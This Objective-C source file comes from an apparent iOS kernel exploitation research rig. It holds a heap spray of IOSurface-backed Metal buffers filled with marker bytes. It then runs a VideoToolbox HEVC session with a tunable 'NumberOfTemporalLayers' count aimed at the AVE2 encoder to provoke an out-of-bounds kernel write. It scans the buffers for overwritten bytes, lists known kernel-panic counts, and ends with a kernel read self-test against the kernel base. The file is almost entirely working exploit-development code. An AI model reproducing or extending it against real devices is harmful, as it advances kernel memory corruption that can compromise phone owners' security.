//
//  P145Composition.m — the COMPOSITION probe. p145.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The stage9 AVE2 temporal-layers fill session (p142's mode, VERBATIM:
//  EncoderUsage=1, RCMode-20 refused-allowed, RealTime=FALSE, HEVC
//  1280x720) composed INSIDE a LIVE p027-class spray: 64 IOSurface-
//  backed Metal buffers held 0x41-filled + a 16-surface 0x53 marker
//  group held for the whole tap, then the overshoot DISCRIMINATOR —
//  every held allocation scanned against its own fill marker.
//
//  HONESTY: kernel WRITE state-manipulation probe (count-scaled fill
//  session composed with a live spray); PANIC-POSSIBLE; composition
//  forbids the panic counts (16462/163/16464-class) = the guard skips
//  them; a foreign-value row = receipt-class evidence of a write we
//  did not author, NEVER hasKread; one tap per force-quit.
//

#import "P145Composition.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <pthread.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P145_BUILD    @"p145-composition-v1"
#define P145_KEY      @"NumberOfTemporalLayers"
#define P145_DEFAULT  8            /* the composition's in-bounds count */
#define P145_SPRAY    64           /* the 0x41-group (held)            */
#define P145_MARKERS  16           /* the 0x53-group (held)            */
#define P145_LEN      0x4000       /* the 0x4000-class allocation size */
#define P145_FILL_A   0x41         /* the p027-class spray paint       */
#define P145_FILL_B   0x53         /* the marker-group paint           */

static NSMutableString *g_buf; static int g_fd = -1;
static pthread_mutex_t g_Lock = PTHREAD_MUTEX_INITIALIZER;
static void L(NSString *s) {
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    pthread_mutex_lock(&g_Lock);
    if (g_buf) [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
    pthread_mutex_unlock(&g_Lock);
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P145R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p145_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e; (void)status; (void)info; (void)sb;
}

static void p145_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p145", arms, 1, &sr, 0, "p145 composition auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p145", 0, outcome);
}

/* ---- stage 1: the live spray (HOLD law: released only at tap end) ---- */
static id g_hold[64];       /* the 0x41-group (strong; the HOLD law) */
static id g_mark[16];       /* the 0x53-group (strong; the HOLD law) */
static uint8_t *g_holdBytes[64];
static uint8_t *g_markBytes[16];
static int g_nHold = 0, g_nMark = 0;

static void p145_spray(id<MTLDevice> mtl) {
    for (int i = 0; i < P145_SPRAY; i++) {
        id<MTLBuffer> b = [mtl newBufferWithLength:P145_LEN
            options:MTLResourceStorageModeShared];
        if (!b) {
            Lf(@"[s1] 0x41-group[%02d] ALLOC FAILED (holding %d of %d)",
               i, g_nHold, P145_SPRAY);
            continue;
        }
        void *base = b.contents;
        uint8_t ok = (base != NULL);
        if (base) { memset(base, P145_FILL_A, P145_LEN); }
        g_hold[g_nHold] = b; g_holdBytes[g_nHold] = base;
        Lf(@"[s1] 0x41-group[%02d] buf=%p len=0x%x fill=0x41 hold=%d",
           g_nHold, (void *)b, (unsigned)P145_LEN, ok);
        g_nHold++;
    }
    for (int i = 0; i < P145_MARKERS; i++) {
        id<MTLBuffer> b = [mtl newBufferWithLength:P145_LEN
            options:MTLResourceStorageModeShared];
        if (!b) {
            Lf(@"[s1] 0x53-group[%02d] ALLOC FAILED (holding %d of %d)",
               i, g_nMark, P145_MARKERS);
            continue;
        }
        void *base = b.contents;
        uint8_t ok = (base != NULL);
        if (base) { memset(base, P145_FILL_B, P145_LEN); }
        g_mark[g_nMark] = b; g_markBytes[g_nMark] = base;
        Lf(@"[s1] 0x53-group[%02d] buf=%p len=0x%x fill=0x53 hold=%d",
           g_nMark, (void *)b, (unsigned)P145_LEN, ok);
        g_nMark++;
    }
    Lf(@"[s1] spray HELD: %d x 0x41-group + %d x 0x53-group (released"
       @" only at tap end — the fill session composes INSIDE this live"
       @" spray)", g_nHold, g_nMark);
}

/* ---- stage 2: the stage9 fill session ON A SECOND THREAD ---- */
static int g_layers = P145_DEFAULT;
static void *g_refCon = NULL;      /* the completion refCon (P142 law) */
static int g_fillRan = 0;

static void *p145_filler(void *ctx) {
    (void)ctx;
    /* the stage9 mode VERBATIM (p142's v4 law) */
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, p145_flushCB, g_refCon, &session);
    if (st != noErr || !session) {
        Lf(@"[s2] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
           (unsigned)st);
        g_fillRan = -1;
        return NULL;
    }
    L(@"[s2] session created (HEVC 1280x720, the stage9 mode, thread 2");
    L(@"      — the spray is LIVE beneath it)");

    OSStatus sUsage = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"EncoderUsage",
        (__bridge CFTypeRef)@1);
    OSStatus sRC = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"RCMode",
        (__bridge CFTypeRef)@20);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                         kCFBooleanFalse);
    CFStringRef key = (__bridge CFStringRef)P145_KEY;
    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
                                     kCFNumberSInt32Type,
                                     &(int32_t){ g_layers });
    st = VTSessionSetProperty(session, key, val);
    CFRelease(val);
    Lf(@"[s2] usage st=%d rc st=%d SetProperty(NumberOfTemporalLayers=%d)"
       @" st=%d", (int)sUsage, (int)sRC, g_layers, (int)st);

    {
        void *rb = NULL;
        OSStatus rst = VTSessionCopyProperty(session, key,
                                             kCFAllocatorDefault, &rb);
        if (rst == 0 && rb) {
            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                             kCFNumberSInt32Type, &rv);
            Lf(@"[s2c] readback = %d (0 = dropped; 1 = the clamp law;"
               @" the raw count = the composition row)", rv);
            CFRelease(rb);
        } else {
            Lf(@"[s2c] readback st=%d", (int)rst);
        }
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    Lf(@"[s2] Prepare st=%d (the spray allocations still held)", (int)st);

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        Lf(@"[s2] CVPixelBufferCreate failed: %d", (int)st);
        VTCompressionSessionInvalidate(session); CFRelease(session);
        g_fillRan = -2;
        return NULL;
    }

    OSStatus firstSt = 0;
    for (int i = 0; i < 4; i++) {
        VTEncodeInfoFlags flags = 0;
        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
        if (i == 0) firstSt = est;
        if (i == 0) L(@"[s3-lead] ENCODE[0] fired INSIDE the live spray");
        if (est != 0) break;
    }
    Lf(@"[s2] battery returned; first st=%d (4-frame compose over the"
       @" held spray)", (int)firstSt);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    L(@"[s2] session invalidated (a clean return = the composition"
       @" survived this count)");
    g_fillRan = 1;
    return NULL;
}

/* ---- stage 3: the overshoot DISCRIMINATOR ---- */
static void p145_discriminate(void) {
    L(@"[s3] discriminator: every held allocation scanned byte-by-byte");
    L(@"    against its OWN fill marker (0x41-group vs 0x53-group");
    L(@"    separately). A foreign-value byte = the OVERSHOOT RECEIPT");
    L(@"    row: receipt-class evidence of a write we did not author;");
    L(@"    NEVER a KRW claim (counts only, no raw dump).");

    unsigned totalA = 0, totalB = 0, pagesA = 0, pagesB = 0;
    for (int i = 0; i < g_nHold; i++) {
        uint8_t *p = g_holdBytes[i];
        if (!p) continue;
        unsigned foreign = 0, distinct = 0;
        uint32_t seen[256]; memset(seen, 0, sizeof seen);
        for (size_t j = 0; j < P145_LEN; j++) {
            if (p[j] != P145_FILL_A) {
                if (++seen[p[j]] == 1) distinct++;
                foreign++;
            }
        }
        if (foreign) {
            pagesA++;
            totalA += foreign;
            Lf(@"[s3] OVERSHOOT RECEIPT row: 0x41-group[%02d] foreign"
               @" bytes=%u, byte class=%s (receipt-class evidence of a"
               @" write we did not author)", i, foreign,
               (distinct == 1) ? @"single-class" : @"multi-class");
        }
    }
    for (int i = 0; i < g_nMark; i++) {
        uint8_t *p = g_markBytes[i];
        if (!p) continue;
        unsigned foreign = 0, distinct = 0;
        uint32_t seen[256]; memset(seen, 0, sizeof seen);
        for (size_t j = 0; j < P145_LEN; j++) {
            if (p[j] != P145_FILL_B) {
                if (++seen[p[j]] == 1) distinct++;
                foreign++;
            }
        }
        if (foreign) {
            pagesB++;
            totalB += foreign;
            Lf(@"[s3] OVERSHOOT RECEIPT row: 0x53-group[%02d] foreign"
               @" bytes=%u, byte class=%s (receipt-class evidence of a"
               @" write we did not author)", i, foreign,
               (distinct == 1) ? @"single-class" : @"multi-class");
        }
    }
    Lf(@"[s3] verdict: 0x41-group %u foreign bytes in %u/%d pages;"
       @" 0x53-group %u foreign bytes in %u/%d pages"
       @" (a CLEAN row = the spray held its own markers for the whole"
       @" composition)", totalA, pagesA, g_nHold,
       totalB, pagesB, g_nMark);
}

@implementation P145Composition

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p145_composition_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p145 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P145_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the COMPOSITION: p142's stage9 fill session (the AVE2");
    L(@"  temporal-layers knob, VERBATIM mode) run INSIDE a live");
    L(@"  p027-class spray — 64 held 0x4000-class IOSurface-backed");
    L(@"  buffers painted 0x41 + a 16-surface marker group painted");
    L(@"  0x53, HELD for the whole tap, then the overshoot");
    L(@"  discriminator reads them back marker-vs-bytes.");
    L(@"[!] PANIC-POSSIBLE (the composed fill session, count knob");
    L(@"  live); ONE tap per force-quit.");
    L(@"[-] composition forbids the panic counts (16462/163/16464-");
    L(@"  class): the guard SKIPS those values — the fill session is");
    L(@"  not created at all; the composition row stays in-bounds.");
    L(@"[honesty] a foreign-value row = receipt-class evidence of a");
    L(@"  write we did not author; no KRW claim; hasKread stays");
    L(@"  kread32-gated.");

    /* the knob: the composition count (Documents/p142_layers.txt) */
    long layers = P145_DEFAULT;
    NSString *knob = [NSString stringWithContentsOfFile:
        [docs stringByAppendingPathComponent:@"p142_layers.txt"]
        encoding:NSUTF8StringEncoding error:nil];
    if (knob) {
        long v = strtol(knob.UTF8String, NULL, 10);
        if (v > 0) layers = v;
        Lf(@"[*] knob file present: layers=%ld", layers);
    } else {
        Lf(@"[*] no knob file: layers=%ld (the composition default)",
           layers);
    }

    /* the panic-count GUARD — the composition row never fires these */
    BOOL panicClass = (layers == 163) ||
        (layers >= 16462 && layers <= 16464);
    if (panicClass) {
        Lf(@"[-] composition forbids the panic counts (16462/163/16464-"
           @"class): layers=%ld SKIPPED — the fill session is NOT"
           @" composed; the spray still runs + the discriminator still"
           @" reads the held markers (the honest in-bounds row)",
           layers);
        p145_bandit("forbidden-count");
    } else {
        g_layers = (int)layers;
    }

    /* ---- STAGE 1: the LIVE SPRAY (held) ---- */
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) {
        L(@"[-] STOP: MTLCreateSystemDefaultDevice nil (no Metal device)");
        p145_bandit("nodevice"); return P145R();
    }
    Lf(@"[s1] Metal device: %@ (IOSurface-backed buffers, 0x4000-class)",
       [mtl name]);
    p145_spray(mtl);

    /* ---- STAGE 2: the fill session INSIDE the live spray ---- */
    g_fillRan = 0;
    if (panicClass) {
        L(@"[s2] SKIPPED (the guard above) — no fill session composed");
    } else {
        pthread_t th;
        g_refCon = (__bridge void *)docs;
        pthread_create(&th, NULL, p145_filler, NULL);
        pthread_join(th, NULL);
        g_refCon = NULL;
        if (g_fillRan == 1) {
            p145_bandit("composed");
        } else {
            p145_bandit("fill-failed");
        }
    }

    /* ---- STAGE 3: the overshoot DISCRIMINATOR ---- */
    p145_discriminate();

    /* ---- release the spray (tap end only) ---- */
    for (int i = 0; i < g_nHold; i++) { g_hold[i] = nil; }
    for (int i = 0; i < g_nMark; i++) { g_mark[i] = nil; }
    mtl = nil;
    L(@"[end-spray] the spray released (tap end; the HOLD law kept it");
    L(@"  live beneath the fill session for the whole composition)");

    /* ---- the honest KRW self-test tail (the p142 v3 gate) ---- */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    {
        P007Board *brd = [P007Board shared];
        uint64_t kb = brd.kbase ? brd.kbase : P007LaneKbase();
        P007Kread32Fn rfn = [brd kread32Fn];
        BOOL pass = NO;
        if (kb && rfn) {
            BOOL okNo = NO;
            pass = (rfn(kb, &okNo) == 0xfeedfacfULL) && okNo;
        } else if (kb && P007LaneLive()) {
            pass = (P007LaneKRead32(kb) == 0xfeedfacfULL);
        }
        if (pass) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)",
               (unsigned long long)kb);
            p145_bandit("selftest-read-pass");
        } else {
            Lf(@"  KRW SELF-TEST READ: FAIL/HOLD (board-kbase=%lld lane-kbase=%@)",
               (long long)brd.kbase,
               kb ? [NSString stringWithFormat:@"%#llx",
                     (unsigned long long)kb] : @"0");
            p145_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [brd kreadSignal]);
    }
    Lf(@"=== p145 end %@ ===", LabLocalMilitaryNow());
    return P145R();
}

@end